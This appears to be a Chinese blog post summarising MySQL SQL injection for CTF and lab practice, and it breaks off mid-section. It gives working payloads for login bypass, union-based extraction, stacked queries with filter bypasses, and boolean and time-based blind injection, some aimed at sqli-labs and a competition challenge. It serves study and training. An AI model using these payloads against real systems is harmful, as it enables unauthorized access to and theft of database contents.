        <content type="html"><![CDATA[<p>沙上有印，光中有</p><hr><h1 id="SQL注入总结"><a href="#SQL注入总结" class="headerlink" title="SQL注入总结"></a>SQL注入总结</h1><h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><h3 id="系统函数"><a href="#系统函数" class="headerlink" title="系统函数"></a>系统函数</h3><blockquote><p>system_user()——系统用户名</p><p>user()——用户名</p><p>current_user()——当前用户名</p><p>session_user()——链接数据库的用户名</p><p>database()——数据库名</p><p>version()——数据库版本</p><p>@@datadir——数据库路径</p><p>@@basedir——数据库安装路径</p><p>@@version_conpile_os——操作系统</p></blockquote><h3 id="字符串连接函数"><a href="#字符串连接函数" class="headerlink" title="字符串连接函数"></a>字符串连接函数</h3><blockquote><p>concat(str1,str2,…)——没有分隔符地连接字符串</p><p>concat_ws(separator,str1,str2,…)——含有分隔符地连接字符串</p><p>group_concat(str1,str2,…)——连接一个组的所有字符串，并以逗号分隔每一条数据。</p></blockquote><h3 id="一般用于尝试的语句"><a href="#一般用于尝试的语句" class="headerlink" title="一般用于尝试的语句"></a>一般用于尝试的语句</h3><p>–+可以用#替换，url 提交过程中Url 编码后的#为%23</p><pre class="language-none"><code class="language-none">or 1=1--+'or 1=1--+"or 1=1--+)or 1=1--+')or 1=1--+") or 1=1--+"))or 1=1--+一般的代码为：$id=$_GET['id'];$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";</code></pre><p>此处考虑两个点，一个是闭合前面你的‘ 另一个是处理后面的‘ ，一般采用两种思路，闭合后面的引号或者注释掉，注释掉采用–+ 或者#（%23）</p><h3 id="union-操作符的介绍"><a href="#union-操作符的介绍" class="headerlink" title="union 操作符的介绍"></a>union 操作符的介绍</h3><p>联合查询是可合并多个相似的选择查询的结果集。等同于将一个表追加到另一个表，从而实现将两个表的查询组合到一起，使用谓词为UNION或UNION ALL。将多个查询的结果合并到一起（纵向合并）：字段数不变，多个查询的记录数合并。</p><p>基本语法：</p><blockquote><p>Select 语句</p><p>Union [union 选项]</p><p>Select 语句;</p><p>Union选项：与select选项基本一样</p><p>Distinct：去重，去掉完全重复的数据（默认的）</p><p>All：保存所有的结果</p></blockquote><pre class="language-none"><code class="language-none">SELECT column_name(s) FROM table_name1UNION [distinct] --默认为distinct                 --如果允许重复值就改为AllSELECT column_name(s) FROM table_name2</code></pre><p>union理论上只要保证字段数一样，不需要每次拿到的数据对应的字段类型一致。永远只保留第一个select语句对应的字段名字。</p><h3 id="sql-中的逻辑运算"><a href="#sql-中的逻辑运算" class="headerlink" title="sql 中的逻辑运算"></a>sql 中的逻辑运算</h3><pre class="language-none"><code class="language-none">Select * from users where id=1 and 1=1;</code></pre><p> 这条语句为什么能够选择出id=1的内容，and 1=1 到底起作用了没有？这里就要清楚sql 语句执行顺序了。 同时这个问题我们在使用万能密码的时候会用到。Select <em>from admin where username=’admin’ and password=’admin’我们可以用’or 1=1# 作为密码输入。原因是为什么？这里涉及到一个逻辑运算，当使用上述所谓的万能密码后，构成的sql 语句为：Select</em> from admin where username=’admin’ and password=’’or 1=1#’  Explain:上面的这个语句执行后，我们在不知道密码的情况下就登录到了admin 用户了。原因是在where 子句后， 我们可以看到三个条件语句username=’admin’ andpassword=’’or 1=1。三个条件用and 和or 进行连接。在sql 中，我们and 的运算优先级大于or 的元算优先级。因此可以看到第一个条件（用a 表示）是真的，第二个条件（用b 表示）是假的，a and b = false,第一个条件和第二个条件执行and 后是假，再与第三个条件or 运算，因为第三个条件1=1 是恒成立的，所以结果自然就为真了。因此上述的语句就是恒真了。.</p><p>①Select <em>from users where id=1 and 1=1;</em> <em>②Select</em> from users where id=1 &amp;&amp; 1=1; ③Select * from users where id=1 &amp; 1=1; 上述三者有什么区别？①和②是一样的，表达的意思是id=1 条件和1=1 条件进行与运算。 ③的意思是id=1 条件与1 进行&amp;位操作，id=1 被当作true，与1 进行&amp; 运算结果还是1，再进行=操作，1=1,还是1（ps：&amp;的优先级大于=） Ps:此处进行的位运算。我们可以将数转换为二进制再进行与、或、非、异或等运算。必要的时候可以利用该方法进行注入结果。例如将某一字符转换为ascii 码后，可以分别与1,2,4,8,16,32.。。。进行与运算，可以得到每一位的值，拼接起来就是ascii 码值。再从ascii 值反推回字符。（运用较少）</p><h3 id="order-by介绍"><a href="#order-by介绍" class="headerlink" title="order by介绍"></a>order by介绍</h3><p>在mysql中order by是用来根据校对规则对数据进行排序</p><p>基本语法：order by 字段 [asc|desc]; //asc升序，默认的</p><p>并且order by还可以多字段排序，先按照第一个字段进行排序，然后再按照第二个字段进行排序。</p><p>因此在sql注入中可以通过order by来判断表中有多少字段，并且并不需要知道字段的名字是什么，通过数字1、2、3等也可以排序，因为在mysql中字段的名字也可以用过1、2、3等来表示。</p><p>参数默认是asc，可以不用加。</p><p>当order by中的字段数为3时，由于表中字段数不足，则报错。因此可判断字段数为2.</p><h3 id="注入流程"><a href="#注入流程" class="headerlink" title="注入流程"></a>注入流程</h3><p>我们的数据库存储的数据按照上图的形式，一个数据库当中有很多的数据表，数据表当中有很多的列，每一列当中存储着数据。我们注入的过程就是先拿到数据库名，在获取到当前数据库名下的数据表，再获取当前数据表下的列，最后获取数据。</p><h3 id="系统数据库（information-schema）"><a href="#系统数据库（information-schema）" class="headerlink" title="系统数据库（information_schema）"></a>系统数据库（information_schema）</h3><p> 在mysql 5.0版本之后，mysql默认在数据库中存放一个”information_schema”的数据库，在该库中，需要记住三个表名，分别是schemata、tables、cliumns。</p><p> schemata表存储该用户创建的所有数据库的库名。</p><p>通过schemata表我们就可以猜数据库了</p><pre class="language-none"><code class="language-none">select schema_name from information_schema.schemata;</code></pre><p>tables表存储该用户创建的所有数据库的库名和表名。</p><p>通过tables表我们就可以猜某库的数据表</p><pre class="language-none"><code class="language-none">select table_name from information_schema.tables where table_schema=’xxxxx’;</code></pre><p>columns表存储该用户</p><p>通过columns表我们就可以猜某表的所有列</p><pre class="language-none"><code class="language-none">Select column_name from information_schema.columns where table_name=’xxxxx’;</code></pre><p>最后获取某列的数据</p><pre class="language-none"><code class="language-none">Select xxxx from xxxx</code></pre><p><strong>当information_schema被屏蔽时，可使用其他的表</strong></p><p>可以参考这边文章：<a href="https://www.anquanke.com/post/id/193512">https://www.anquanke.com/post/id/193512</a></p><p><strong>innodb表</strong></p><p>MySQL 5.6 及以上版本存在<code>innodb_index_stats</code>，<code>innodb_table_stats</code>两张表，其中包含新建立的库和表</p><pre class="language-none"><code class="language-none">select table_name from mysql.innodb_table_stats where database_name = database(); select table_name from mysql.innodb_index_stats where database_name = database();</code></pre><p><strong>sys表</strong></p><p>在MySQL 5.7.9中sys中新增了一些视图，可以从中获取表名</p><pre class="language-none"><code class="language-none">#包含inSELECT object_name FROM `sys`.`x$innodb_buffer_stats_by_table` where object_schema = database();SELECT object_name FROM `sys`.`innodb_buffer_stats_by_table` WHERE object_schema = DATABASE();SELECT TABLE_NAME FROM `sys`.`x$schema_index_statistics` WHERE TABLE_SCHEMA = DATABASE();SELECT TABLE_NAME FROM `sys`.`schema_auto_increment_columns` WHERE TABLE_SCHEMA = DATABASE();SELECT table_schema FROM sys.schema_table_statistics GROUP BY table_schema;#不包含inSELECT TABLE_NAME FROM `sys`.`x$schema_flattened_keys` WHERE TABLE_SCHEMA = DATABASE();SELECT TABLE_NAME FROM `sys`.`x$ps_schema_table_statistics_io` WHERE TABLE_SCHEMA = DATABASE();SELECT TABLE_NAME FROM `sys`.`x$schema_table_statistics_with_buffer` WHERE TABLE_SCHEMA = DATABASE();SELECT table_schema FROM sys.x$schema_flattened_keys GROUP BY table_schema;#通过表文件的存储路径获取表名SELECT FILE FROM `sys`.`io_global_by_file_by_bytes` WHERE FILE REGEXP DATABASE();SELECT FILE FROM `sys`.`io_global_by_file_by_latency` WHERE FILE REGEXP DATABASE();SELECT FILE FROM `sys`.`x$io_global_by_file_by_bytes` WHERE FILE REGEXP DATABASE();#查询指定库的表（若无则说明此表从未被访问）SELECT table_name FROM sys.schema_table_statistics WHERE table_schema='mspwd' GROUP BY table_name;SELECT table_name FROM sys.x$schema_flattened_keys WHERE table_schema='mspwd' GROUP BY table_name;#统计所有访问过的表次数:库名,表名,访问次数select table_schema,table_name,sum(io_read_requests+io_write_requests) io from sys.schema_table_statistics group bytable_schema,table_name order by io desc;#查看所有正在连接的用户详细信息SELECT user,db,command,current_statement,last_statement,time FROM sys.session;#查看所有曾连接数据库的IP,总连接次数SELECT host,total_connections FROM sys.host_summary;</code></pre><p>包含之前查询记录的表</p><pre class="language-none"><code class="language-none">SELECT QUERY FROM sys.x$statement_analysis WHERE QUERY REGEXP DATABASE();SELECT QUERY FROM `sys`.`statement_analysis` where QUERY REGEXP DATABASE();</code></pre><p>performance_schema表</p><pre class="language-none"><code class="language-none">SELECT object_name FROM `performance_schema`.`objects_summary_global_by_type` WHERE object_schema = DATABASE();SELECT object_name FROM `performance_schema`.`table_handles` WHERE object_schema = DATABASE();SELECT object_name FROM `performance_schema`.`table_io_waits_summary_by_index_usage` WHERE object_schema = DATABASE();SELECT object_name FROM `performance_schema`.`table_io_waits_summary_by_table` WHERE object_schema = DATABASE();SELECT object_name FROM `performance_schema`.`table_lock_waits_summary_by_table` WHERE object_schema = DATABASE();</code></pre><p>包含之前查询记录的表</p><pre class="language-none"><code class="language-none">SELECT digest_text FROM `performance_schema`.`events_statements_summary_by_digest` WHERE digest_text REGEXP DATABASE();</code></pre><p>包含表文件路径的表</p><pre class="language-none"><code class="language-none">SELECT file_name FROM `performance_schema`.`file_instances` WHERE file_name REGEXP DATABASE();</code></pre><p>表格 还在加载中，请等待加载完成后再尝试复制</p><p>上诉表格中虽然有能够查列名的表，但是查出来的数据都不全，当知道<code>flag</code>所在的库和表名时，但无法获取到列名，就需要利用<strong>无列名盲注了</strong></p><h2 id="select被过滤"><a href="#select被过滤" class="headerlink" title="select被过滤"></a>select被过滤</h2><pre class="language-none"><code class="language-none">mysql 8.0.19`新增语句`tableTABLE table_name [ORDER BY column_name] [LIMIT number [OFFSET number]]</code></pre><p>可以把<code>table t</code>简单理解成<code>select * from t</code>，和<code>select</code>的区别在于</p><ul><li><code>table</code>总是显示表的所有列</li><li><code>table</code>不允许任何的行过滤;也就是说，<code>TABLE</code>不支持任何<code>WHERE</code>子句。 可以用来盲注表名</li></ul><pre class="language-none"><code class="language-none">admin'and\x0a(table\x0ainformation_schema.TABLESPACES_EXTENSIONS\x0alimit\x0a7,1)&gt;(BINARY('{}'),'0')#</code></pre><p>同时代替<code>select</code>被过滤导致只能同表查询的问题</p><p>PS：新增的<code>values</code>语句也挺有意思，在某些情况似乎可以代替<code>union</code>或<code>select</code>进行<code>order by</code>盲注</p><h2 id="联合查询的类型"><a href="#联合查询的类型" class="headerlink" title="联合查询的类型"></a>联合查询的类型</h2><p>union 联合注入，union 的作用是将两个sql 语句进行联合。Union 可以从下面的例子中可以看出，强调一点：union 前后的两个sql 语句的选择列数要相同才可以。Union all 与union 的区别是增加了去重的功能。</p><p>并且运用information_schema的知识。</p><p>sql-labs/less-1</p><p>字符型报错</p><pre class="language-none"><code class="language-none">//order by判断字段http://127.0.0.1/sqli-labs/Less-1/?id=-1' or 1=1 order by 3 --+//通过union select判断显示的是哪些字段http://127.0.0.1/sqli-labs/Less-1/?id=-1' union select 1,2,3 --+//通过information_schema爆数据库http://127.0.0.1/sqli-labs/Less-1/?id=-1'  union select 1,database(),group_concat(schema_name) from information_schema.schemata --+//爆数据表</code></pre><p>admin’or(updatexml(1,concat(version()),1)or’1’like’1</p><p>select(group_concat(table_name)from(infromation_schema.table)where(table_schema)like(‘geek’))</p><p>select(group_concat(table_name)from(information_schema.tables)where(table_schema)like(‘geek’))</p><p>sql-labs/less-2</p><p>整数报错</p><p>与less-1差不多 将’去除即可</p><p>sql-labs/less-3</p><p>可以成功注入的有：</p><blockquote><p>‘) or ‘1’=(‘1’ ) or 1=1 –+</p></blockquote><p>将less1 中的’ 添加）即可 ‘）</p><p>sql-labs/less-4</p><p>可以成功注入的有：</p><blockquote><p>“) or ”1”=(“1 “) or 1=1 –+</p></blockquote><p>将less1 中的‘ 更换为“)</p><p>sql-labs/less-5</p><h2 id="堆查询注射"><a href="#堆查询注射" class="headerlink" title="堆查询注射"></a>堆查询注射</h2><p>堆叠注入。从名词的含义就可以看到应该是一堆sql 语句（多条）一起执行。而在真实的运用中也是这样的，我们知道在mysql 中，主要是命令行中，每一条语句结尾加; 表示语句结束。这样我们就想到了是不是可以多句一起使用。这个叫做stacked injection。</p><h3 id="原理介绍"><a href="#原理介绍" class="headerlink" title="原理介绍"></a>原理介绍</h3><p>在SQL 中，分号（;）是用来表示一条sql 语句的结束。试想一下我们在; 结束一个sql语句后继续构造下一条语句，会不会一起执行？因此这个想法也就造就了堆叠注入。而unioninjection（联合注入）也是将两条语句合并在一起，两者之间有什么区别么？区别就在于union或者union all 执行的语句类型是有限的，可以用来执行查询语句，而堆叠注入可以执行的是任意的语句。</p><p>例如以下这个例子。</p><p>当执行查询后，第一条显示查询信息，第二条则将整个表进行删除。</p><h3 id="堆叠注入的局限性"><a href="#堆叠注入的局限性" class="headerlink" title="堆叠注入的局限性"></a>堆叠注入的局限性</h3><p>堆叠注入的局限性在于并不是每一个环境下都可以执行，可能受到API 或者数据库引擎不支持的限制，当然了权限不足也可以解释为什么攻击者无法修改数据或者调用一些程序。</p><p>虽然我们前面提到了堆叠查询可以执行任意的sql 语句，但是这种注入方式并不是十分的完美的。在我们的web 系统中，因为代码通常只返回一个查询结果，因此，堆叠注入第二个语句产生错误或者结果只能被忽略，我们在前端界面是无法看到返回结果的。因此，在读取数据时，我们建议使用union（联合）注入。同时在使用堆叠注入之前，我们也是需要知道一些数据库相关信息的，例如表名，列名等信息。可考虑使用RENAME关键字，将想要的数据列名/表名更改成返回数据的SQL语句所定义的表/列名。</p><pre class="language-none"><code class="language-none">以PHP为例，使用的条件为$mysqli-&gt;multi_query($sql);</code></pre><p>使用堆叠注入时，可使用的方法：</p><p>当过滤<code>select</code>时，可使用<code>handler</code>语句。<code>handler</code>语句并不具备<code>select</code>语句的所有功能。它是<code>mysql</code>专用的语句，并没有包含到<code>SQL</code>标准中</p><pre class="language-none"><code class="language-none">handler users open as hd; #指定数据表进行载入并将返回句柄重命名handler hd read first; #读取指定表/句柄的首行数据handler hd read next; #读取指定表/句柄的下一行数据handler hd close; #关闭句柄</code></pre><p>预处理：</p><pre class="language-none"><code class="language-none">prepare xxx from "sql语句";execute xxx;由于sql语句是字符串，因此可以使用操作字符串的函数，绕过一些过滤比如过滤了selectPREPARE st from concat('s','elect', ' * from `1919810931114514`');EXECUTE st;#</code></pre><h3 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h3><h4 id="强网杯随便注"><a href="#强网杯随便注" class="headerlink" title="强网杯随便注"></a>强网杯随便注</h4><pre class="language-none"><code class="language-none">1';show tables;#  看有什么表在里面1';show columns from `1919810931114514`;#  看列1';show columns from `words`;# 可以发现这个表是可以回显内容的我们可以用函数将1919810931114514表改成words表，来让他自动回显RENAME TABLE `words` TO `words1`;RENAME TABLE `1919810931114514` TO `words`;ALTER TABLE `words` CHANGE `flag` `id` VARCHAR(100) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL;#将新words表的flag改为id避免开始无法查询接下来还有预处理语句使用方法PREPARE name from '[my sql sequece]';   //预定义SQL语句EXECUTE name;  //执行预定义SQL语句(DEALLOCATE || DROP) PREPARE name;  //删除预定义SQL语句SET @tn = 'hahaha';  //存储表名SET @sql = concat('select * from ', @tn);  //存储SQL语句PREPARE name from @sql;   //预定义SQL语句EXECUTE name;  //执行预定义SQL语句(DEALLOCATE || DROP) PREPARE sqla;  //删除预定义SQL语句由于过滤了select可以用chr()最后payload:最终payload1';PREPARE jwt from concat(char(115,101,108,101,99,116), ' * from `1919810931114514` ');EXECUTE jwt;#1';HANDLER FlagHere OPEN;HANDLER FlagHere READ FIRST;HANDLER FlagHere CLOSE;#</code></pre><h2 id="无列名盲注"><a href="#无列名盲注" class="headerlink" title="无列名盲注"></a>无列名盲注</h2><p>当我们无法获取字段时，比如information_schema被过滤，可使用无列名注入</p><h3 id="使用union-select重命名法"><a href="#使用union-select重命名法" class="headerlink" title="使用union select重命名法"></a>使用<code>union select重命名法</code></h3><pre class="language-none"><code class="language-none">mysql&gt; select * from users;+----+----------+------------+| id | username | password   |+----+----------+------------+|  1 | Dumb     | Dumb       ||  2 | Angelina | I-kill-you |+----+----------+------------+2 rows in set (0.00 sec)mysql&gt; select 1,2,3 union select * from users;+----+----------+------------+| 1  | 2        | 3          |+----+----------+------------+|  1 | 2        | 3          ||  1 | Dumb     | Dumb       ||  2 | Angelina | I-kill-you |+----+----------+------------+3 rows in set (0.00 sec)#对比可以发现使用union时，列名被替换为前面的select的列名了，为1，2，3。mysql&gt; select a.1 from (select 1,2,3 union select * from users) a;+---+| 1 |+---+| 1 || 1 || 2 |+---+3 rows in set (0.00 sec)#将前面生成的表重命名为a，再使用select a.1，查询第一列的值#可以看到，使用union查询，在不知道列名的情况下，依然能够将列注入出来，通过1，2，3选择第几列</code></pre><pre class="language-none"><code class="language-none">select c from (select 1 as a, 1 as b, 1 as c union select * from test)x limit 1 offset 1;select a.`3` from(select 1,2,3 union select * from admin)a limit 1,1;//无逗号，有join版本select a from (select * from (select 1 `a`)m join (select 2 `b`)n join (select 3 `c`)t where 0 union select * from test)x;</code></pre><h3 id="比较法"><a href="#比较法" class="headerlink" title="比较法"></a>比较法</h3><pre class="language-none"><code class="language-none">mysql&gt; select 'b' &lt; 'azzzzz';+----------------+| 'b' &lt; 'azzzzz' |+----------------+|              0 |+----------------+1 row in set (0.00 sec)mysql&gt; select 'ab' &lt; 'azzzzz'    -&gt; ;+-----------------+| 'ab' &lt; 'azzzzz' |+-----------------+|               1 |+-----------------+1 row in set (0.00 sec)#mysql比较，从第一个字符还是比较ascii的大小，一次往后#并且多列的比较时从第一列的第一位开始的mysql&gt; select (select 1,'Dumb','a')&gt; (select * from users limit 1);+------------------------------------------------------+| (select 1,'Dumb','a')&gt; (select * from users limit 1) |+------------------------------------------------------+|                                                    0 |+------------------------------------------------------+1 row in set (0.00 sec)mysql&gt; select (select 1,'Dumb','b') &gt; (select * from users limit 1);+-------------------------------------------------------+| (select 1,'Dumb','b') &gt; (select * from users limit 1) |+-------------------------------------------------------+|                                                     0 |+-------------------------------------------------------+1 row in set (0.00 sec)mysql&gt; select (select 1,'Dumb','D') &gt; (select * from users limit 1);+-------------------------------------------------------+| (select 1,'Dumb','D') &gt; (select * from users limit 1) |+-------------------------------------------------------+|                                                     0 |+-------------------------------------------------------+1 row in set (0.00 sec)mysql&gt; select (select 1,'Dumb','F') &gt; (select * from users limit 1);+-------------------------------------------------------+| (select 1,'Dumb','F') &gt; (select * from users limit 1) |+-------------------------------------------------------+|                                                     1 |+-------------------------------------------------------+1 row in set (0.00 sec)#通过比较可以将三列的数据全部盲注出来</code></pre><pre class="language-none"><code class="language-none">((SELECT 1,concat('{result+chr(mid)}', cast("0" as JSON)))&lt;(SELECT * FROM `f1ag_1s_h3r3_hhhhh`))</code></pre><p>要求后面select的结果必须是一行，可以通过limit限制一行。mysql中对char型大小写是不敏感的，盲注的时候要么可以使用<code>hex</code>或者<code>binary</code>。</p><h2 id="SQL-盲注"><a href="#SQL-盲注" class="headerlink" title="SQL 盲注"></a>SQL 盲注</h2><p>何为盲注？盲注就是在sql 注入过程中，sql 语句执行的选择后，选择的数据不能回显到前端页面。此时，我们需要利用一些方法进行判断或者尝试，这个过程称之为盲注。</p><h3 id="基于布尔SQL-盲注"><a href="#基于布尔SQL-盲注" class="headerlink" title="基于布尔SQL 盲注"></a>基于布尔SQL 盲注</h3><h4 id="Sql注入截取字符串常用函数"><a href="#Sql注入截取字符串常用函数" class="headerlink" title="Sql注入截取字符串常用函数"></a>Sql注入截取字符串常用函数</h4><p>在sql注入中，往往会用到截取字符串的问题，例如不回显的情况下进行的注入，也成为盲注，这种情况下往往需要一个一个字符的去猜解，过程中需要用到截取字符串。</p><p><strong>mid()</strong></p><blockquote><p>mid(s,n,len);</p><p>从字符串 s 的 n 位置截取长度为 len 的子字符串</p></blockquote><pre class="language-none"><code class="language-none">SELECT MID("RUNOOB", 2, 3) AS ExtractString; -- UNO</code></pre><p><strong>substr()/substring()</strong></p><blockquote><p>substr(s, start, length);</p><p>substring(s, start, length)</p><p>从字符串 s 的 start 位置截取长度为 length 的子字符串</p></blockquote><pre class="language-none"><code class="language-none">SELECT MID("RUNOOB", 2, 3) AS ExtractString; -- UNO                                </code></pre><p><strong>left()</strong></p><blockquote><p>left(s,n);</p><p>返回字符串 s 的前 n 个字符</p></blockquote><pre class="language-none"><code class="language-none">SELECT LEFT('runoob',2);-- ru</code></pre><p><strong>right()</strong></p><blockquote><p>right(s,n);</p><p>返回字符串 s 的后 n 个字符</p></blockquote><pre class="language-none"><code class="language-none">SELECT right('runoob',2);-- ob</code></pre><p><strong>ascii()/ord()</strong></p><blockquote><p>ascii(s);/ord(s);</p><p>返回字符串 s 的第一个字符的 ASCII 码。</p><p>这里不考虑多字节字符，比如汉字</p></blockquote><p><strong>trim()/rtrim()/ltrim()</strong></p><blockquote><p>ltrim(s);</p><p>去掉字符串s开始处的空格</p><p>rtrim(s);</p><p>去掉字符串s结尾处的空格</p><p>trim(s);</p><p>去掉字符串开始和结尾处的空格</p></blockquote><pre class="language-none"><code class="language-none">SELECT TRIM('    RUNOOB    ') AS TrimmedString;-- RUNOOBSELECT RTRIM("RUNOOB     ") AS RightTrimmedString;   -- RUNOOBSELECT LTRIM("    RUNOOB") AS LeftTrimmedString;-- RUNOOB</code></pre><p>这个怎么用来截取字符串呢？</p><pre class="language-none"><code class="language-none">TRIM([BOTH/LEADING/TRAILING] 目标字符串 FROM 源字符串）BOTH删除两边的指定字符串LEADING删除左边的指定字符串TARILING删除右边的指定字符串select trim(LEADING "a" from "abcd") = trim(LEADING "b" from "abcd");以这个为例，我们将删除的字符串ASCII差限制在1，例如a和b当这个结果返回0时，则第一个字符是a或者b。接着让a的ASCII+2变成c，如果返回1，则字符串第一位为a，反之第一位为b。这样做的目的是为了方便写脚本第二个字符判断select trim(LEADING "aa" from "abcd") = trim(LEADING "ab" from "abcd");接着重复上面的过程，判断第二个字符以此推出整个字符串如果=用regexp替代那么正确的字符一定在regexp前面以这个abcd为例Trim(leading ‘a’ from ‘abcd’) regexp trim(LEADING ‘x’ from ‘abcd’)就是bcd regexp abcd返回0， 如果反过来就是abcd regexp bcd 返回1因此只需判断第一步即可，而不需要ASCII+2去判断了注：y1ng师傅在[HFCTF 2021 Final]hatenum中用到了这个方法，通过持续递归，多次套娃trim。如果字符串长度被限制，可使用。一次只截断几个字符例如：select trim(LEADING "b" from trim(LEADING "a" from "abcd"));-- cd先截断a，返回字符串bcd，在截断b，返回字符串cd</code></pre><p><strong>注：可以看到这个函数可以不使用</strong>**,<strong><strong>的，如果</strong></strong>,**<strong>被过滤可以使用</strong></p><p><strong>INSERT()</strong></p><blockquote><p>INSERT(s1,x,len,s2)</p><p>字符串 s2 替换 s1 的 x 位置开始长度为 len 的字符串</p></blockquote><pre class="language-none"><code class="language-none">SELECT INSERT("google.com", 1, 6, "runoob");  -- 输出：runoob.comSELECT INSERT("google.com", 1,2, "runoob");-- 输出：runoobogle.com如何使用呢？第一步删除起始的前x位第二步套娃删除x+1位以后的所有根据这两步我们就能取出字符串的任意位置的字符，也就相当于字符串的截取例子：第一步删除起始的前x位SELECT INSERT("abcdef", 1,0, "");-- 输出：abcdefSELECT INSERT("abcdef", 1,1, "");-- 输出：bcdef第二步套娃删除x+1位以后的所有SELECT INSERT((INSERT("abcdef", 1,0, "")),2,9999,"");-- 输出：aSELECT INSERT((INSERT("abcdef", 1,1, "")),2,9999,"");-- 输出：b可以看到我们只要改变中间的数字，就可以输出任意位置的字符</code></pre><p><strong>注：TRIM和INSERT函数比较特别，基本上是不会被过滤了，如果常用的截取函数不能用时，可选择这两个函数</strong></p><p><strong>if/case</strong></p><p>用在select查询当中，当做一种条件来进行判断</p><p>基本语法：if(条件,为真结果,为假结果)</p><p><strong>case基本语法</strong></p><pre class="language-none"><code class="language-none">MySQL 的 case when 的语法有两种：简单函数 CASE [col_name] WHEN [value1] THEN [result1]…ELSE [default] END搜索函数 CASE WHEN [expr] THEN [result1]…ELSE [default] ENDselect case 'a' when 'a' then 1 else 0 end;-- 1select case when 98&gt;12 then 1 else 0 end;</code></pre><p><strong>注：可以看出case的用法与if类似，当if被过滤或者</strong>**,**<strong>被过滤可以替换为case，并且在时间盲注中，条件语句非常有用！</strong></p><h4 id="regexp-rlike-正则表达式注入"><a href="#regexp-rlike-正则表达式注入" class="headerlink" title="regexp/rlike 正则表达式注入"></a><strong>regexp/rlike 正则表达式注入</strong></h4><p>用法介绍：select user() regexp ‘^[a-z]’; Explain：正则表达式的用法，user()结果为root，regexp 为匹配root 的正则表达式。 第二位可以用select user() regexp ‘^ro’来进行。</p><p>结果返回0或者1.</p><p><strong>示例介绍：</strong></p><pre class="language-none"><code class="language-none">select * from users where id=1 and 1=(if((user() regexp '^r'),1,0));select * from users where id=1 and 1=(user() regexp'^ri');</code></pre><p>通过if 语句的条件判断，返回一些条件句，比如if 等构造一个判断。根据返回结果是否等于0 或者1 进行判断。</p><pre class="language-none"><code class="language-none">select * from users where id=1 and 1=(select 1 from information_schema.tableswhere table_schema='security' and table_name regexp '^us[a-z]' limit 0,1);</code></pre><p>这里利用select 构造了一个判断语句。我们只需要更换regexp 表达式即可</p><p>‘^u[a-z]’ -&gt; ‘^us[a-z]’ -&gt; ‘^use[a-z]’ -&gt; ‘^user[a-z]’ -&gt; FALSE</p><p>如何知道匹配结束了？这里大部分根据一般的命名方式（经验）就可以判断。但是如何你在无法判断的情况下，可以用table_name regexp ‘^username$’来进行判断。^是从开头进行匹配，$是从结尾开始判断。更多的语法可以参考mysql 使用手册进行了解。</p><p>但是这种做法是错误的，limit 作用在前面的select 语句中，而不是regexp。那我们该如何选择。其实在regexp 中我们是取匹配table_name 中的内容，只要table_name 中有的内容，我们用regexp 都能够匹配到。因此上述语句不仅仅可以选择user，还可以匹配其他项。</p><p><strong>注：</strong><code>regexp是不区分大小写的，需要大小写敏感需要加上binary关键字</code></p><pre class="language-none"><code class="language-none">select binary database() regexp "^CTF";</code></pre><h4 id="like-匹配注入"><a href="#like-匹配注入" class="headerlink" title="like 匹配注入"></a><strong>like 匹配注入</strong></h4><p>和上述的正则类似，mysql 在匹配的时候我们可以用like 进行匹配S。</p><p>这里可以用于过滤<code>=</code>使用</p><p>用法：select user() like ‘ro%’</p><h3 id="基于时间的SQL-盲注延时注入"><a href="#基于时间的SQL-盲注延时注入" class="headerlink" title="基于时间的SQL 盲注延时注入"></a>基于时间的SQL 盲注延时注入</h3><pre class="language-none"><code class="language-none">If(ascii(substr(database(),1,1))&gt;115,0,sleep(5))%23--if 判断语句，条件为假，执行sleep</code></pre><p>Ps：遇到以下这种利用sleep()延时注入语句</p><pre class="language-none"><code class="language-none">select sleep(find_in_set(mid(@@version, 1, 1), '0,1,2,3,4,5,6,7,8,9,.'));</code></pre><p>该语句意思是在0-9 之间找版本号的第一位。但是在我们实际渗透过程中，这种用法是不可取的，因为时间会有网速等其他因素的影响，所以会影响结果的判断。</p><p><strong>benchmark</strong></p><p>MySQL有一个内置的BENCHMARK()函数，可以测试某些特定操作的执行速度。参数可以是需要执行的次数和表达式。表达式可以是任何的标量表达式，比如返回值是标量的子查询或者函数。该函数可以很方便地测试某些特定操作的性能，比如通过测试可以发现，MD5()函数比SHAI()函数要快</p><pre class="language-none"><code class="language-none">select benchmark(1000000,sha1(sha1(sha1(sha1("1")))));</code></pre><pre class="language-none"><code class="language-none">UNION SELECT IF(SUBSTRING(current,1,1)=CHAR(119),BENCHMARK(5000000,ENCODE(‘MSG’,’by 5 seconds’)),null) FROM (select database() as current) as tb1;</code></pre><p><strong>笛卡儿积</strong></p><p>这种方法又叫做heavy query，可以通过选定一个大表来做笛卡儿积，但这种方式执行时间会几何倍数的提升，在站比较大的情况下会造成几何倍数的效果，实际利用起来非常不好用。</p><p>1.<code>count()</code>函数是用来统计表中记录的一个函数，返回匹配条件的行数。 2.<code>count()</code>语法： （1）<code>count(*)</code>—包括所有列，返回表中的记录数，相当于统计表的行数，在统计结果的时候，不会忽略列值为NULL的记录。 （2）<code>count(1)</code>—忽略所有列，1表示一个固定值，也可以用<code>count(2)</code>、<code>count(3)</code>代替，在统计结果的时候，不会忽略列值为<code>NULL</code>的记录。 （3）<code>count(列名)</code>—只包括列名指定列，返回指定列的记录数，在统计结果的时候，会忽略列值为NULL的记录（不包括空字符串和0），即列值为NULL的记录不统计在内。 （4）<code>count(distinct 列名)</code>—只包括列名指定列，返回指定列的不同值的记录数，在统计结果的时候，在统计结果的时候，会忽略列值为NULL的记录（不包括空字符串和0），即列值为NULL的记录不统计在内。 3.<code>count(*)&amp;count(1)&amp;count(列名)</code>执行效率比较： （1）如果列为主键，<code>count(列名)</code>效率优于<code>count(1)</code> （2）如果列不为主键，<code>count(1)</code>效率优于<code>count(列名)</code> （3）如果表中存在主键，<code>count(主键列名)</code>效率最优 （4）如果表中只有一列，则<code>count(*)</code>效率最优 （5）如果表有多列，且不存在主键，则<code>count(1)</code>效率优于<code>count(*)</code></p><pre class="language-none"><code class="language-none">select count(*) from information_schema.columns A;1 row in set (1.47 sec)</code></pre><p><strong>get_lock</strong></p><pre class="language-none"><code class="language-none">SELECT GET_LOCK(key, timeout) FROM DUAL;SELECT RELEASE_LOCK(key) FROM 